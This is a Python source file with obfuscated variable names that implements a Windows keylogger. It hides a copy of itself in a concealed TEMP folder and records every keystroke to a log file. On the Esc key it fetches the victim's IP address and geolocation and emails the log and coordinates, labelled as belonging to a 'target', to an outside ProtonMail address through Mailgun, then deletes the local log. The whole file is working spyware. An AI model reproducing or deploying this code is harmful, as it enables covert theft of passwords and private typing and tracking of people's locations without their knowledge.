from pynput import keyboard #line:10
from dotenv import load_dotenv #line:11
import requests #line:12
import os #line:13
import shutil #line:14
from random import randint #line:15
import win32con ,win32api #line:16
load_dotenv ()#line:20
def hide_program ():#line:23
    OOOO0OOO00OO0OO00 =os .environ .get ('TEMP')+"\\.tmp"+str (randint (0 ,99999 ))#line:25
    os .makedirs (OOOO0OOO00OO0OO00 )#line:28
    win32api .SetFileAttributes (OOOO0OOO00OO0OO00 ,win32con .FILE_ATTRIBUTE_HIDDEN )#line:31
    print (OOOO0OOO00OO0OO00 )#line:33
    shutil .copy (__file__ ,OOOO0OOO00OO0OO00 )#line:34
hide_program ()#line:36
f =open ("log.txt","a")#line:40
def on_press (O00OO0O00O0OOOO0O ):#line:44
    try :#line:45
        print ('alphanumeric key {0} pressed'.format (O00OO0O00O0OOOO0O .char ))#line:47
    except AttributeError :#line:48
        print ('special key {0} pressed'.format (O00OO0O00O0OOOO0O ))#line:50
    f .write ('{0}'.format (O00OO0O00O0OOOO0O ))#line:51
def on_release (O00O0OOO0OO000OOO ):#line:56
    print ('{0} released'.format (O00O0OOO0OO000OOO ))#line:58
    if O00O0OOO0OO000OOO ==keyboard .Key .esc :#line:59
        f .close ()#line:61
        def OO00OO0OOOO00O0O0 ():#line:64
            OOO0O0O0O0OO00000 =os .environ .get ("MAIL_APIKEY")#line:65
            OO0O0OOO0O0O0OO00 =os .environ .get ("IP_APIKEY")#line:66
            O0OO00OO00000O0OO =requests .get ("https://geo.ipify.org/api/v1?apiKey="+str (OO0O0OOO0O0O0OO00 )).json ()#line:69
            requests .post ("https://api.mailgun.net/v3/sandboxad10bda10dae43e39b2c8a3d6a849abf.mailgun.org/messages",auth =("api",f"{OOO0O0O0O0OO00000}"),data ={"from":"Mailgun Sandbox <postmaster@sandboxad10bda10dae43e39b2c8a3d6a849abf.mailgun.org>","to":"Host <l0wk3yiaan@protonmail.com>","subject":"Log File For Target: "+O0OO00OO00000O0OO ["ip"],"text":"Log file for target:\n\nIP:"+O0OO00OO00000O0OO ["ip"]+"\nLatitude:"+str (O0OO00OO00000O0OO ["location"]["lat"])+"\nLongitude:"+str (O0OO00OO00000O0OO ["location"]["lng"])},files =[("attachment",("log.txt",open ("log.txt","rb").read ()))])#line:80
        OO00OO0OOOO00O0O0 ()#line:82
        os .remove ('log.txt')#line:83
        return False #line:84
with keyboard .Listener (on_press =on_press ,on_release =on_release )as listener :#line:90
    listener .join ()#line:92
listener =keyboard .Listener (on_press =on_press ,on_release =on_release )#line:97
listener .start ()